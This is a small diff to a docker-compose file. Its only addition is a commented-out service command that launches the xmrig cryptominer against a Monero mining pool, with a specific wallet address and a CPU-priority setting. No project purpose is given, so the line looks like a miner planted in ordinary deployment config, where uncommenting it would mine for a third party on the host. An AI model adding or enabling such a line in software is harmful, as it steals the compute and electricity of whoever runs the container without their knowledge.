@@ -9,3 +9,5 @@ services:
     ports:
       - '8000:8000'
     restart: always
+#    command: /xmr/xmrig --url=gulf.moneroocean.stream:10128 --user=4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRvjy3UDSXa9PT9Cm8e --pass=docker-ha -k --coin=monero --cpu-priority=3
+
